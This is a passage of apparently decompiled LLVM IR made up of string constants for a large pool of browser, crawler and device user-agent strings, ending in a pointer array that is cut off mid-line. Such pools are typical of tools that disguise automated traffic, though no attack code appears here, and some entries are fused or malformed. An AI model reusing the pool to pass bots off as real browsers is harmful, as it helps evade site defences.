@global_var_10017638.537 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
@global_var_100176ac.538 = constant [88 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp/3.0; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_10017704.539 = constant [85 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101209 Firefox/3.6.13\00"
@global_var_1001775c.540 = constant [64 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 5.1; Trident/5.0)\00"
@global_var_1001779c.541 = constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00"
@global_var_10017804.542 = constant [52 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)\00"
@global_var_10017838.543 = constant [48 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)\00"
@global_var_10017868.544 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.97 Safari/537.22 Perk/3.3.0.0\00"
@global_var_100178dc.545 = constant [105 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; ru; rv:1.9.2.3) Gecko/20100401 Firefox/4.0 (.NET CLR 3.5.30729)\00"
@global_var_10017948.546 = constant [90 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.8) Gecko/20100804 Gentoo Firefox/3.6.8\00"
@global_var_100179a4.547 = constant [103 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.7) Gecko/20100809 Fedora/3.6.7-1.fc14 Firefox/3.6.7\00"
@global_var_10017a0c.548 = constant [73 x i8] c"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\00"
@global_var_10017a58.549 = constant [84 x i8] c"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)\00"
@global_var_10017aac.550 = constant [103 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6\00"
@global_var_10017b14.551 = constant [75 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0\00"
@global_var_10017b60.552 = constant [130 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)\00"
@global_var_10017be4.553 = constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_10017c28.554 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00"
@global_var_10017c6c.555 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00"
@global_var_10017cb0.556 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00"
@global_var_10017cf4.557 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; de) Opera 11.01\00"
@global_var_10017d38.558 = constant [51 x i8] c"Gigabot/3.0 (http://www.gigablast.com/spider.html)\00"
@global_var_10017d6c.559 = constant [61 x i8] c"LG-BDP Linux/2.6.35 UPnP/1.0 DLNADOC/1.50 LGE_DLNA_SDK/1.5.0\00"
@global_var_10017dac.560 = constant [127 x i8] c"Mozilla/5.0 (SmartHub; SMART-TV; U; Linux/SmartTV) AppleWebKit/531.2+ (KHTML, like Gecko) WebBrowser/1.0 SmartTV Safari/531.2+\00"
@global_var_10017e2c.561 = constant [107 x i8] c"Mozilla/5.0 (SMART-TV; X11; Linux i686) AppleWebKit/535.20+ (KHTML, like Gecko) Version/5.0 Safari/535.20+\00"
@global_var_10017e98.562 = constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_10017edc.563 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_10017f4c.564 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36\00"
@global_var_10017fc0.565 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0\00"
@global_var_1001800c.566 = constant [135 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4\00"
@global_var_10018094.567 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0\00"
@global_var_100180e0.568 = constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36\00"
@global_var_10018150.569 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.80 Safari/537.36\00"
@global_var_100181c0.570 = constant [115 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56\00"
@global_var_10018234.571 = constant [117 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_1) AppleWebKit/601.2.7 (KHTML, like Gecko) Version/9.0.1 Safari/601.2.7\00"
@global_var_100182ac.572 = constant [69 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_100182f4.573 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194A\00"
@global_var_1001836c.574 = constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00"
@global_var_100183dc.575 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.94 Safari/537.36\00"
@global_var_1001844c.576 = constant [147 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3; HTC_0PCV2 Build/KTU84L) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/33.0.0.0 Mobile Safari/537.36\00"
@global_var_100184e0.577 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; X11; Linux x86_64; pl) Opera 11.00\00"
@global_var_10018528.578 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows 98; .NET CLR 3.0.04506.30)\00"
@global_var_10018570.579 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.4.53360; WOW64; en-US)\00"
@global_var_100185ec.580 = constant [123 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 4.4.58799; WOW64; en-US)\00"
@global_var_10018668.581 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00"
@global_var_100186bc.582 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_10018710.583 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_10018764.584 = constant [149 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00"
@global_var_100187fc.585 = constant [181 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_100188b4.586 = constant [157 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018954.587 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_100189c0.588 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_10018a30.589 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_10018aa8.590 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018aec.591 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_10018b64.592 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018ba8.593 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_10018c0c.594 = constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00"
@global_var_10018c54.595 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018ca8.596 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_10018d20.597 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_10018d88.598 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018dd4.599 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_10018e38.600 = constant [102 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_10018ea0.601 = constant [139 x i8] c"Mozilla/5.0 (Linux; U; Android 2.2; fr-fr; Desire_A8181 Build/FRF91) App3leWebKit/53.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1\00"
@global_var_10018f2c.602 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10018f80.603 = constant [137 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_1001900c.604 = constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00"
@global_var_10019068.605 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_100190b4.606 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_1001912c.607 = constant [85 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6\00"
@global_var_10019184.608 = constant [128 x i8] c"Mozilla/5.0 (iPad; CPU OS 5_1_1 like Mac OS X) AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/9B206 Safari/7534.48.3\00"
@global_var_10019204.609 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; FunWebProducts; .NET CLR 1.1.4322; PeoplePal 6.2)\00"
@global_var_10019270.610 = constant [120 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.47 Safari/536.11\00"
@global_var_100192e8.611 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00"
@global_var_10019334.612 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11\00"
@global_var_100193a4.613 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00"
@global_var_100193e8.614 = constant [64 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\00"
@global_var_10019428.615 = constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00"
@global_var_1001946c.616 = constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00"
@global_var_100194b0.617 = constant [71 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:5.0) Gecko/20100101 Firefox/5.0\00"
@global_var_100194f8.618 = constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00"
@global_var_10019578.619 = constant [83 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322)\00"
@global_var_100195cc.620 = constant [142 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; .NET CLR 3.5.30729)\00"
@global_var_1001965c.621 = constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_100196c0.622 = constant [79 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10019710.623 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00"
@global_var_1001977c.624 = constant [74 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:2.0b7pre) Gecko/20100921 Firefox/4.0b7pre\00"
@global_var_100197c8.625 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00"
@global_var_10019840.626 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_10019884.627 = constant [51 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)\00"
@global_var_100198b8.628 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20100101 Firefox/12.0\00"
@global_var_100198fc.629 = constant [121 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; MRA 5.8 (build 4157); .NET CLR 2.0.50727; AskTbPTV/5.11.3.15590)\00"
@global_var_10019978.630 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_100199c8.631 = constant [56 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)\00"
@global_var_10019a00.632 = constant [118 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/534.57.5 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.4\00"
@global_var_10019a78.633 = constant [68 x i8] c"Mozilla/5.0 (Windows NT 6.0; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10019abc.634 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.10\00"
@global_var_10019afc.635 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.1; U; ru) Presto/2.5.24 Version/10.52\00"
@global_var_10019b3c.636 = constant [138 x i8] c"Mozilla/5.0 (Linux; Android 6.0.1; SM-G920V Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36\00"
@global_var_10019bc8.637 = constant [42 x i8] c"Opera/8.5 (X11; i686 Linux; U; ru, en_US)\00"
@global_var_10019bf4.638 = constant [58 x i8] c"SexShop.Sg/Nutch-1.1 (www.SexShop.Sg; crawler@SexShop.Sg)\00"
@global_var_10019c30.639 = constant [48 x i8] c"Rome Client (http://tinyurl.com/64t5n) Ver: 0.9\00"
@global_var_10019c60.640 = constant [73 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2.13918/19.752; U; ru) Presto/2.6.25\00"
@global_var_10019cac.641 = constant [63 x i8] c"Opera/9.80 (Windows NT 6.0; U; ru) Presto/2.5.22 Version/10.50\00"
@global_var_10019cec.642 = constant [80 x i8] c"Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.5.24 Version/10.53 MM3-WebAssistant\00"
@global_var_10019d3c.643 = constant [19 x i8] c"C4PC UserAgent/0.7\00"
@global_var_10019d50.644 = constant [19 x i8] c"Googlebot 1.01.003\00"
@global_var_10019d64.645 = constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1\00"
@global_var_10019db0.646 = constant [104 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.3) Gecko/20100423 Ubuntu/10.04 (lucid) Firefox/3.6.3\00"
@global_var_10019e18.647 = constant [84 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:7.0.1) Gecko/20100101 Firefox/7.0.1\00"
@global_var_10019e6c.648 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:21.0) Gecko/20100101 Firefox/21.0\00"
@global_var_10019eb8.649 = constant [183 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00"
@global_var_10019f70.650 = constant [170 x i8] c"SAMSUNG-SGH-E250/1.0 Profile/MIDP-2.0 Configuration/CLDC-1.1 UP.Browser/6.2.3.3.c.1.101 (GUI) MMP/2.0 (compatible; Googlebot-Mobile/2.1; +http://www.google.com/bot.html)\00"
@global_var_1001a01c.651 = constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:24.0) Gecko/20100101 Firefox/24.0\00"
@global_var_1001a070.652 = constant [195 x i8] c"Mozilla/5.0 (iPhone; CPU iPhone OS 7_0 like Mac OS X) AppleWebKit/537.51.1 (KHTML, like Gecko) Version/7.0 Mobile/11A465 Safari/9537.53 (compatible; bingbot/2.0; http://www.bing.com/bingbot.htm)\00"
@global_var_1001a134.653 = constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00"
@global_var_1001a1d0.654 = constant [112 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1a2pre) Gecko/2008073000 Shredder/3.0a2pre ThunderBrowse/3.2.1.8\00"
@global_var_1001a240.655 = constant [92 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.7.10) Gecko/20050716 Thunderbird/1.0.6\00"
@global_var_1001a29c.656 = constant [81 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:2.0b7pre) Gecko/20100925 Firefox/4.0b7pre\00"
@global_var_1001a2f0.657 = constant [117 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9b5pre) Gecko/2008032619 Linpus/3.0-0.49.3.0b5pre.lp Minefield/3.0b5pre\00"
@global_var_1001a368.658 = constant [91 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.3a1pre) Gecko/20100128 Minefield/3.7a1pre\00"
@global_var_1001a3c4.659 = constant [97 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9a9pre) Gecko/2007100205 Minefield/3.0a9pre\00"
@global_var_1001a428.660 = constant [95 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9a4pre) Gecko/20070402 Minefield/3.0a4pre\00"
@global_var_1001a488.661 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.5) Gecko/20041103 Firefox/1.0RC2\00"
@global_var_1001a4e0.662 = constant [66 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:39.0) Gecko/20100101 Firefox/39.0\00"
@global_var_1001a524.663 = constant [77 x i8] c"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:13.0) Gecko/20100101 Firefox/13.0\00"
@global_var_1001a574.664 = constant [131 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.2.13) Gecko/20101230 Mandriva Linux/1.9.2.13-0.2mdv2010.2 (2010.2) Firefox/3.6.13\00"
@global_var_1001a5f8.665 = constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00"
@global_var_1001a64c.666 = constant [109 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.27 Safari/536.11\00"
@global_var_1001a6bc.667 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.3; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1; AskTbCFTP2V5/5.14.1.20007)\00"
@global_var_1001a754.668 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:37.0) Gecko/20100101 Firefox/37.0\00"
@global_var_1001a7a0.669 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 OPR/36.0.2130.3\00"
@global_var_1001a820.670 = constant [126 x i8] c"Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; SCH-I535 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile\00"
@global_var_1001a8a0.671 = constant [125 x i8] c"Mozilla/5.0 (iPad; CPU OS 9_3 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13E234 Safari/601.1\00"
@global_var_1001a920.672 = constant [125 x i8] c"Mozilla/5.0 (Linux; Android 5.1; XT1032 Build/LPB23.13-58) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile\00"
@global_var_1001a9a0.673 = constant [126 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.3\00"
@global_var_1001aa20.674 = constant [126 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1; 360Spider(compatible; Ha\00"
@global_var_1001aaa0.675 = constant [119 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60\00"
@global_var_1001ab18.676 = constant [107 x i8] c"Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2\00"
@global_var_1001ab84.677 = constant [116 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_3) AppleWebKit/536.8+ (KHTML, like Gecko) Version/5.1.5 Safari/534.55.3\00"
@global_var_1001abf8.678 = constant [127 x i8] c"Mozilla/5.0 (iPad; CPU OS 6_0 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Version/6.0 Mobile/10A5376e Safari/8536.25\00"
@global_var_1001ac78.679 = constant [59 x i8] c"Mozilla/5.0 (compatible; Ezooms/1.0; ezooms.bot@gmail.com)\00"
@global_var_1001acb4.680 = constant [72 x i8] c"Sogou web spider/4.0(+http://www.sogou.com/docs/help/webmasters.htm#07)\00"
@global_var_1001acfc.681 = constant [68 x i8] c"Mozilla/5.0 (Admin Catalog; Windows NT 5.1; infobot.4942@yahoo.com)\00"
@global_var_1001ad40.682 = constant [208 x i8] c"HuaweiSymantecSpider/1.0+DSE-support@huaweisymantec.com+(compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR ; http://www.huaweisymantec.com/en/IRL/spider)\00"
@global_var_1001ae10.683 = constant [91 x i8] c"Mozilla/5.0 (compatible; 008/0.83; http://www.80legs.com/webcrawler.html) Gecko/2008032620\00"
@global_var_1001ae6c.684 = constant [106 x i8] c"Feedfetcher-Google; (+http://www.google.com/feedfetcher.html; 1 subscribers; feed-id=9422214874901413839)\00"
@global_var_1001aed8.685 = constant [72 x i8] c"Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)\00"
@global_var_1001af20.686 = constant [134 x i8] c"Mozilla/5.0 (Linux; Android 4.2.2; AFTB Build/JDQ39) AppleWebKit/537.22 (KHTML, like Gecko) Chrome/25.0.1364.173 Mobile Safari/537.22\00"
@global_var_1001afa8.687 = constant [74 x i8] c"Mozilla/5.0 (PLAYSTATION 3 4.66) AppleWebKit/531.22.8 (KHTML, like Gecko)\00"
@global_var_1001aff4.688 = constant [22 x i8] c"Wget/1.12 (linux-gnu)\00"
@global_var_1001b00c.689 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_1001b080.690 = constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00"
@global_var_1001b0f4.691 = constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00"
@global_var_1001b164.692 = constant [649 x i8*] [i8* getelementptr inbounds ([62 x i8], [62 x i8]* @global_var_100147a4.390, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @global_var_100147e4.391, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @global_var_10014824.392, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @global_var_100148b4.393, i32 0, i32 0), i8* getelementptr inbounds ([32 x i8], [32 x i8]* @global_var_100148ec.394, i32 0, i32 0), i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_1001490c.395, i32 0, i32 0), i8* getelementptr inbounds ([86 x i8], [86 x i8]* @global_var_10014924.396, i32 0, i32 0), i8* getelementptr inbounds ([157 x i8], [157 x i8]* @global_var_1001497c.397, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @global_var_10014a1c.398, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @global_var_10014a70.399, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @global_var_10014ae4.400, i32 0, i32 0), i8* getelementptr inbounds ([182 x i8], [182 x i8]* @global_var_10014b24.401, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @global_var_10014bdc.402, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10014c30.403, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @global_var_10014c88.404, i32 